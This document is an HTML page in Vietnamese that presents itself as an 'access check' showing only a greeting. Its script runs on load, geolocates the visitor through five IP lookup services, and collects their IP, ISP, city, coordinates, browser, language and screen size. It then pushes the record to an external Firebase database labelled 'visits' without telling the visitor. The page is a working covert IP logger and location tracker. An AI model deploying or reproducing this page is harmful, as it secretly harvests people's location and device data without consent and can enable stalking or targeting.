<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<title>Kiểm tra truy cập</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
<h2>Xin chào</h2>
<p id="status">Đang kiểm tra...</p>
<pre id="log" style="background:#111;color:#0f0;padding:10px;font-size:12px;white-space:pre-wrap"></pre>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

const app = initializeApp({
  databaseURL: "https://shopmduy-default-rtdb.asia-southeast1.firebasedatabase.app/"
});
const db = getDatabase(app);

const logEl = document.getElementById("log");
function log(m) {
  console.log(m);
  logEl.textContent += m + "\n";
  document.getElementById("status").textContent = m;
}

function countryFlag(code) {
  if (!code || code.length !== 2) return "🏳";
  code = code.toUpperCase();
  return String.fromCodePoint(0x1F1E6 + code.charCodeAt(0) - 65,
                              0x1F1E6 + code.charCodeAt(1) - 65);
}

const APIS = [
  {
    name: "ipwho.is",
    url: "https://ipwho.is/",
    map: d => d.ip ? {
      ip: d.ip, lat: d.latitude, lng: d.longitude,
      city: d.city, region: d.region, country: d.country_code,
      org: d.connection?.isp, acc: d.accuracy_radius
    } : null
  },
  {
    name: "ipapi.co",
    url: "https://ipapi.co/json/",
    map: d => d.ip ? {
      ip: d.ip, lat: d.latitude, lng: d.longitude,
      city: d.city, region: d.region, country: d.country_code,
      org: d.org, acc: null
    } : null
  },
  {
    name: "ipinfo.io",
    url: "https://ipinfo.io/json",
    map: d => {
      if (!d.ip) return null;
      const [lat, lng] = (d.loc || ",").split(",").map(Number);
      return {
        ip: d.ip, lat, lng,
        city: d.city, region: d.region, country: d.country,
        org: d.org, acc: null
      };
    }
  },
  {
    name: "ip-api.com",
    url: "http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,lat,lon,isp,query",
    map: d => d.status === "success" ? {
      ip: d.query, lat: d.lat, lng: d.lon,
      city: d.city, region: d.regionName, country: d.countryCode,
      org: d.isp, acc: null
    } : null
  },
  {
    name: "bigdatacloud",
    url: "https://api.bigdatacloud.net/data/reverse-geocode-client",
    map: d => d.latitude ? {
      ip: "?", lat: d.latitude, lng: d.longitude,
      city: d.city, region: d.principalSubdivision, country: d.countryCode,
      org: "?", acc: null
    } : null
  }
];

function haversine(a, b, c, d) {
  const R = 6371;
  const dLat = (c - a) * Math.PI / 180;
  const dLng = (d - b) * Math.PI / 180;
  const x = Math.sin(dLat/2)**2 +
            Math.cos(a*Math.PI/180) * Math.cos(c*Math.PI/180) *
            Math.sin(dLng/2)**2;
  return 2 * R * Math.asin(Math.sqrt(x));
}

function median(arr) {
  const s = [...arr].sort((a, b) => a - b);
  const m = Math.floor(s.length / 2);
  return s.length % 2 ? s[m] : (s[m-1] + s[m]) / 2;
}

async function fetchAll() {
  const promises = APIS.map(async api => {
    try {
      const r = await fetch(api.url, { cache: "no-store" });
      if (!r.ok) throw new Error("HTTP " + r.status);
      const d = await r.json();
      const m = api.map(d);
      if (m && m.lat && m.lng) {
        log("✓ " + api.name + ": " + m.lat + ", " + m.lng);
        return { ...m, source: api.name };
      }
      log("✗ " + api.name + ": không có tọa độ");
      return null;
    } catch (e) {
      log("✗ " + api.name + ": " + e.message);
      return null;
    }
  });

  const results = (await Promise.all(promises)).filter(Boolean);
  return results;
}

function clusterBest(results) {
  if (results.length === 0) return null;
  if (results.length === 1) return results[0];

  // Tìm điểm có nhiều hàng xóm gần nhất
  let bestScore = -1;
  let best = null;

  for (const r of results) {
    let score = 0;
    for (const o of results) {
      if (o === r) continue;
      const d = haversine(r.lat, r.lng, o.lat, o.lng);
      if (d < 50) score += 1 / (d + 1);
    }
    if (score > bestScore) {
      bestScore = score;
      best = r;
    }
  }
  return best;
}

function weightedAvg(results) {
  if (results.length === 0) return null;

  const center = clusterBest(results);
  const filtered = results.filter(r =>
    haversine(center.lat, center.lng, r.lat, r.lng) < 100
  );

  log("Lọc: " + filtered.length + "/" + results.length + " điểm gần tâm");

  if (filtered.length === 0) return center;

  const latMed = median(filtered.map(r => r.lat));
  const lngMed = median(filtered.map(r => r.lng));

  return {
    lat: latMed,
    lng: lngMed,
    ip: filtered[0].ip,
    city: filtered[0].city,
    region: filtered[0].region,
    country: filtered[0].country,
    org: filtered[0].org,
    sources: filtered.map(r => r.source).join(", ")
  };
}

(async () => {
  try {
    log("Bắt đầu — gọi " + APIS.length + " API song song...");
    const results = await fetchAll();
    log("Nhận " + results.length + "/" + APIS.length + " kết quả");

    if (results.length === 0) throw new Error("Không API nào trả về");

    const best = weightedAvg(results);
    log("Tọa độ cuối: " + best.lat + ", " + best.lng);

    const record = {
      ip: best.ip,
      org: best.org || "?",
      country: best.country || "?",
      flag: countryFlag(best.country),
      region: best.region || "?",
      city: best.city || "?",
      latitude: best.lat,
      longitude: best.lng,
      sources: best.sources,
      userAgent: navigator.userAgent,
      language: navigator.language,
      screen: screen.width + "x" + screen.height,
      time: new Date().toISOString(),
      sent: false,
      status: "⏳ chờ gửi",
      sent_at: ""
    };

    const result = await push(ref(db, "visits"), record);
    log("Firebase OK, key=" + result.key);
    log("XONG");
  } catch (e) {
    log("DỪNG: " + e.message);
  }
})();
</script>
</body>
</html>
